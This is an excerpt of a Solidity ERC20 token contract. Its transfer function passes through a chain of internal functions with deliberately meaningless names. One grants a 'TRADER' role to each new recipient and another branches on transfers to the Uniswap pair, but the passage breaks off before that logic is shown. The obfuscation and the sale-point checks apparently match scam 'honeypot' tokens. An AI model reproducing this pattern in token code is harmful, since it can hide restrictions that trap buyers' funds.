...
abstract contract EMSCYSDConsole is Context, EMSCYSDRoleControl {
    ...
    function _rolenewCheke(bytes32 role, address account, uint256 num) internal virtual {
...
contract EMSCYSDERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is EMSCYSDERC20, EMSCYSDConsole {
    ...
    ) EMSCYSDERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(EMSCYSDERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");


        _EMSCYSDnifdxxk(from, to, amt);
    }



    function _EMSCYSDnifdxxk(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");

        _EMSCYSDxcondlf(from, to, amt);
    }

    function _EMSCYSDxcondlf(address from, address to, uint256 amt) internal {
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _EMSCYSDxcinrg(from, to, amt);
    }

    function _EMSCYSDxcinrg(address from, address to, uint256 amt) internal {
        ...
        _EMSCYSDckingd(from, to, amt);
    }

    function _EMSCYSDckingd(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        _EMSCYSDxckrindg(from, to, amt);
    }

    function _EMSCYSDxckrindg(address from, address to, uint256 amt) internal {
        
        _EMSCYSDxkings(from, to, amt);
    }

    function _EMSCYSDxkings(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        _EMSCYSDuxcprn(from, to, amt);
    }

    function _EMSCYSDuxcprn(address from, address to, uint256 amt) internal {
